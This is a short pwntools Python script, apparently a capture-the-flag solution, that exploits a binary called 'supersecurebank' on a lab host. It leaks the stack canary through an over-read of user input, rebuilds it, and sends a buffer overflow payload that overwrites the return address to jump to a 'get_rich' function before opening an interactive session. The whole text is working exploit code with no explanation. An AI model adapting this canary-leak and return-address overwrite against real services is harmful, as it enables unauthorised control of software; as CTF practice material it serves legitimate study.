from pwn import *

r = remote("10.45.1.2", 54323)
# r = process("./supersecurebank")

r.sendlineafter(b"Choice: ", b"1")

r.recv(1000)
r.sendline(b"1")

r.recv(1000)
r.sendline(b"1" * 8)

data = r.recv(100)

print(data.hex())

canary = b"\x00" + data.split(b"\n")[1][:7]

print("Canary: " + canary.hex())

get_rich_addr = 0x0040077d

payload = b"a" * 24
payload += canary
payload += b"a" * 8
payload += p64(get_rich_addr)

r.sendline(payload)

r.interactive()

